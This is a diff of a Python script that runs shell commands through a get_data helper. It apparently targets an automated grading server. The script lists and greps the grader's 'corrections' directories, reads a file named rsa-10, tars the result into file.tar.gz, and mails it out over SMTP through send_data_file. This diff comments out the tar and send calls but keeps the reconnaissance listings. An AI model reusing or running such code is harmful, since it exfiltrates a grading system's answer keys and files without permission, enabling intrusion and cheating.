@@ -39,7 +39,7 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("tar -czvf file.tar.gz ../../../../*_5") or ""
+# my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/252/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
@@ -49,7 +49,6 @@ my_data = get_data("tar -czvf file.tar.gz ../../../../*_5") or ""
 # my_data = get_data("ls -l ../../../../../../home") or ""
 # my_data += "\n#######################\n"
 my_data = get_data("pwd") or ""
-my_data += get_data("ls -la") or ""
 my_data += get_data("ls -l ../../../../*_5") or ""
 # my_data += get_data("ls -l ../../../../hbtn_checker_functions") or ""
 # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
@@ -96,4 +95,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-send_data_file("file.tar.gz", "gz")
+# send_data_file("file.tar.gz", "gz")
